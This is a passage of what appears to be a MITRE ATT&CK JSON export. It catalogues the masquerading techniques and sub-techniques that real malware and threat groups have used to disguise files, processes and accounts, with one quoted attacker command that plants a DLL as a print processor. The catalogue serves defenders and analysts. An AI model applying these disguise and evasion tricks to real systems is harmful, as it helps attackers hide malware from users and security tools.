a legitimate 32-bit Windows DLL."}, {"id": "S0144", "name": "ChChes", "description": "ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe)."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy has used the name eoffice.exe in attempt to appear as a legitimate file."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has copied and renamed itself to DumpMediaSpotifyMusicConverter."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can rename its running process to [kworker:0/1] to masquerade as a Linux kernel thread. Cyclops Blink has also named RC scripts used for persistence after WatchGuard artifacts."}, {"id": "S1014", "name": "DanBot", "description": "DanBot files have been named UltraVNC.exe and WINVNC.exe to appear as legitimate VNC tools."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool."}, {"id": "S0187", "name": "Daserf", "description": "Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs."}, {"id": "S0600", "name": "Doki", "description": "Doki has disguised a file as a Linux kernel module."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus has been named Flash.exe, and its dropper has been named IExplorer."}, {"id": "S0567", "name": "Dtrack", "description": "One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN is often disguised as a legitimate Windows binary such as w3wp.exe or conn.exe."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service."}, {"id": "S0605", "name": "EKANS", "description": "EKANS has been disguised as update.exe to appear as a valid executable."}, {"id": "S0081", "name": "Elise", "description": "If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has renamed tools to match legitimate utilities, such as renaming GOST tunneling instances to java in victim environments."}, {"id": "S0171", "name": "Felismus", "description": "Felismus has masqueraded as legitimate Adobe Content Management System files."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has named malicious files update.exe and loaded them into the compromise host's \"Public\" folder."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has attempted to run Darkside ransomware with the filename sleep.exe."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can be disguised as a Visual Studio file such as Windows.Data.TimeZones.zh-PH.pri to evade detection. Also, FoggyWeb's loader can mimic a genuine dll file that carries out the same import functions as the legitimate Windows version.dll file."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has masqueraded as trusted software rsyncd and dbus-inotifier."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used legitimate process names to hide malware including svchosst."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has named malicious binaries serv.exe, winprint.dll, and chrome_elf.dll and has set its persistence in the Registry with the key value Chrome Update to appear legitimate."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy's setup file installs initial executables under the folder %WinDir%\\System32\\PluginManager."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has named malicious browser extensions and update files to appear legitimate."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert has been disguised as a Growl help file."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has used the name postgressql.exe to mask a malicious payload."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has been named exec_32.dll to mimic a legitimate MS Outlook .dll."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL."}, {"id": "S1022", "name": "IceApple", "description": "IceApple .NET assemblies have used App_Web_ in their file names to appear legitimate."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has modified legitimate .dll files to include malicious code."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has named a PsExec executable winupd to mimic a legitimate Windows update file."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe has used registry values and file names associated with Adobe software, such as AcroRd32.exe."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has dropped their malware into legitimate installed software paths including: C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe, C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe, C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe, and C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has masqueraded as a legitimate Windows tool."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has renamed malware to legitimate names such as ESTCommon.dll or patch.dll."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has been disguised as legitimate software programs associated with the travel and airline industries."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has created a shortcut called \"Anti virus service.lnk\" in an apparent attempt to masquerade as a legitimate file."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has been packed to appear as a component to Bitdefender\u2019s kernel-mode driver, TRUFOS.SYS."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron has used filenames associated with Exchange and Outlook for binary and configuration files, such as winmail.dat."}, {"id": "S0582", "name": "LookBack", "description": "LookBack has a C2 proxy tool that masquerades as GUP.exe, which is software used by Notepad++."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has disguised their exfiltration malware as ZoomVideoApp.exe."}, {"id": "S0409", "name": "Machete", "description": "Machete renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables."}, {"id": "G0095", "name": "Machete", "description": "Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used dllhost.exe to mask Fast Reverse Proxy (FRP) and MicrosoftOutLookUpdater.exe for Plink."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files."}, {"id": "S0500", "name": "MCMD", "description": "MCMD has been named Readme.txt to appear legitimate."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has been downloaded as a file named lsass.exe, which matches the legitimate Windows file."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has been seen changing malicious files to appear legitimate."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary."}, {"id": "S0083", "name": "Misdat", "description": "Misdat saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used names like adobeupdate.dat and PotPlayerDB.dat to disguise PlugX, and a file named OneDrive.exe to load a Cobalt Strike payload."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has used the filename AutoUpdater.js to mimic legitimate update files and has also used the Cyrillic homoglyph characters \u0421 (0xd0a1) and \u0430 (0xd0b0), to produce the filename \u0421hrome.Upd\u0430te.zip."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae uses functions named StartUserModeBrowserInjection and StopUserModeBrowserInjection indicating that it's trying to imitate chrome_frame_helper.dll."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has used legitimate looking filenames for its loader including update.dll and x64.dll."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has been disguised as legitimate programs, such as Java and Telegram Messenger."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT installs itself in %ALLUSERPROFILE%\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\""}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors renamed a malicious executable to rundll32.exe to allow it to blend in with other Windows system files."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, threat actors installed Rising Sun in the Startup folder and disguised it as mssync.exe."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can masquerade as a Flash Player update."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel attempts to download and execute Saint Bot to a statically-defined location attempting to mimic svchost: %TEMP%\\svjhost.exe."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as \"Net Monitor.\" They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has been named wuauclt.exe to appear as the legitimate Windows Update AutoUpdate Client."}, {"id": "S0587", "name": "Penquin", "description": "Penquin has mimicked the Cron binary to hide itself on compromised systems."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has been disguised as legitimate Adobe and PotPlayer files."}, {"id": "S0453", "name": "Pony", "description": "Pony has used the Adobe Reader icon for the downloaded file to look more trustworthy."}, {"id": "G0033", "name": "Poseidon Group", "description": "Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop has used a DLL named Goopdate.dll to impersonate a legitimate Google update file."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has dropped DCSrv under the svchost.exe name to disk."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has executed a malicious executable by naming it svchost.exe."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1."}, {"id": "S1084", "name": "QUIETEXIT", "description": "QUIETEXIT has attempted to change its name to cron upon startup. During incident response, QUIETEXIT samples have been identified that were renamed to blend in with other legitimate files."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop was installed under names that resembled legitimate Windows file and directory names."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has used names to mimic legitimate software including \"vmtoolsd.exe\" to spoof Vmtools."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has masqueraded as a 7zip installer."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has masqueraded as VMware.exe."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl mimicked legitimate file names and scheduled tasks, e.g. MicrosoftCurrentupdatesCheck andMdMMaintenenceTask to mask malicious files and scheduled tasks."}, {"id": "S0125", "name": "Remsec", "description": "The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims."}, {"id": "S0496", "name": "REvil", "description": "REvil can mimic the names of known executables."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used shell scripts which download mining executables and saves them with the filename \"java\"."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro has used the filename systemd-daemon in an attempt to appear legitimate."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as C:\\Users\\Public."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has been disguised as a legitimate executable, including as Windows SDK."}, {"id": "S1099", "name": "Samurai", "description": "Samurai has created the directory %COMMONPROGRAMFILES%\\Microsoft Shared\\wmi\\ to contain DLLs for loading successive stages."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has avoided detection by naming a malicious binary explorer.exe."}, {"id": "S1019", "name": "Shark", "description": "Shark binaries have been named audioddg.pdb and Winlangdb.pdb in order to appear legitimate."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter spoofed itself as AlphaZawgyl_font.exe, a specialized Unicode font."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has downloaded a DLL to the C:\\windows\\system32\\drivers\\ folder and renamed it with a .sys extension."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has used a legitimate DLL file name, Duser.dll to disguise a malicious remote access tool."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable."}, {"id": "G0091", "name": "Silence", "description": "Silence has named its backdoor \"WINWORD.exe\"."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has created a fake rm binary to replace the legitimate Linux binary."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has mimicked the names of known executables, such as mediaplayer.exe."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can use variations of Microsoft and Outlook spellings, such as \"Microsift\", in its file names to avoid detection."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has been named AutoUpdater.js to mimic legitimate update files."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security."}, {"id": "S0058", "name": "SslMM", "description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut."}, {"id": "S0188", "name": "Starloader", "description": "Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater has been named calc.exe to appear as a legitimate calculator program."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has been bundled with legitimate software installation files for disguise."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has been named CrashReporter.exe to appear as a legitimate Mozilla executable."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST created VBScripts that were named after existing services or folders to blend into legitimate activities."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT was identified on disk with a filename of taskhostsvc.exe and it created an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log."}, {"id": "S0578", "name": "SUPERNOVA", "description": "SUPERNOVA has masqueraded as a legitimate SolarWinds DLL."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used file names to mimic legitimate Windows files or system functionality."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "The TAINTEDSCRIBE main executable has disguised itself as Microsoft\u2019s Narrator."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask has masqueraded as executable files such as winupdate.exe, date.exe, or win.exe."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP files had names that resembled legitimate Window file and directory names."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle chooses its payload creation path from a randomly selected service name from netsvc."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has been deployed as w64time.dll to appear legitimate."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used the name debug.exe for malware components."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe can mimic legitimate Windows directories by using the same icons and names."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has hidden payloads in Flash directories and fake installer files."}, {"id": "G0010", "name": "Turla", "description": "Turla has named components of LunarWeb to mimic Zabbix agent logs."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer mimics a legitimate Russian program called USB Disk Security."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors."}, {"id": "S0141", "name": "Winnti for Windows", "description": "A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has named a first stage dropper Kaspersky Update Agent in order to appear legitimate."}, {"id": "S0086", "name": "ZLib", "description": "ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules."}]}, {"name": "Space after Filename", "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.", "detailed_description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\nFor example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt  (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.", "id": "T1036.006", "examples": [{"id": "S0276", "name": "Keydnap", "description": "Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program."}]}, {"name": "Double File Extension", "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.", "detailed_description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.", "id": "T1036.007", "examples": [{"id": "S0534", "name": "Bazar", "description": "The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate masquerades malicious LNK files as PDF objects using the double extension .pdf.lnk."}, {"id": "S1015", "name": "Milan", "description": "Milan has used an executable named companycatalog.exe.config to appear benign."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used an additional filename extension to hide the true file type."}]}, {"name": "Masquerade File Type", "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is  0xFF 0xD8 and the file extension is either .JPE, .JPEG or .JPG.", "detailed_description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is  0xFF 0xD8 and the file extension is either .JPE, .JPEG or .JPG.\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections.\nCommon non-executable file types and extensions, such as text files (.txt) and image files (.jpg, .gif, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of test.gif. A user may not know that a file is malicious due to the benign appearance and file extension.\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.", "id": "T1036.008", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA has been delivered through a LNK file disguised as a folder."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has been disguised as a .jpg file."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used Microsoft Word icons to hide malicious LNK files."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents."}, {"id": "S0650", "name": "QakBot", "description": "The QakBot payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin has historically been delivered via infected USB drives containing a malicious LNK object masquerading as a legitimate folder."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension."}]}, {"name": "Break Process Trees", "description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \"parent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.", "detailed_description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \"parent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the fork() API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the init system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\nAnother example is using the \"daemon\" syscall to detach from the current parent process and run in the background.", "id": "T1036.009", "examples": [{"id": "S1161", "name": "BPFDoor", "description": "After initial execution, BPFDoor forks itself and runs the fork with the --init flag, which allows it to execute secondary clean up operations. The parent process terminates leaving the forked process to be inherited by the legitimate process init."}]}, {"name": "Masquerade Account Name", "description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during Create Account, although accounts may also be renamed at a later date. This may also coincide with Account Access Removal if the actor first deletes an account before re-creating one with the same name.", "detailed_description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during Create Account, although accounts may also be renamed at a later date. This may also coincide with Account Access Removal if the actor first deletes an account before re-creating one with the same name.\nOften, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management. They may also give accounts generic, trustworthy names, such as \"admin\", \"help\", or \"root.\" Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to Account Discovery.\nNote that this is distinct from Impersonation, which describes impersonating specific trusted individuals or organizations, rather than user or service account names.", "id": "T1036.010", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System)."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to create or enable accounts, such as support_388945a0."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account."}, {"id": "S0143", "name": "Flame", "description": "Flame can create backdoor accounts with login HelpAssistant on domain connected systems if appropriate rights are available."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has created local accounts named help and DefaultAccount on compromised machines."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has created a new user named supportaccount."}]}]}, {"name": "Modify Authentication Process", "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.", "detailed_description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the 